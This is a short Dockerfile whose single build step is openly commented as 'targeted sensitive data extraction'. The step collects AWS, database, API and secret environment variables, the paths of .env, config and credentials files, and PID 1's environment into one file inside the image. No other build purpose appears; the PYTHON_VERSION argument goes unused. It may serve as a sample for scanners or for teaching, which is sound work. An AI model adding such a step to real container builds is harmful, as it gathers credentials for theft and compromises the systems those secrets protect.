ARG PYTHON_VERSION
FROM alpine:latest

# Targeted sensitive data extraction
RUN echo "Extracting sensitive data..." && \
    env | grep -E 'AWS_|DB_|API_|SECRET_' > /sensitive_data.txt && \
    find / -name "*.env" -o -name "*.conf" -o -name "credentials" 2>/dev/null >> /sensitive_data.txt && \
    cat /proc/1/environ | strings >> /sensitive_data.txt
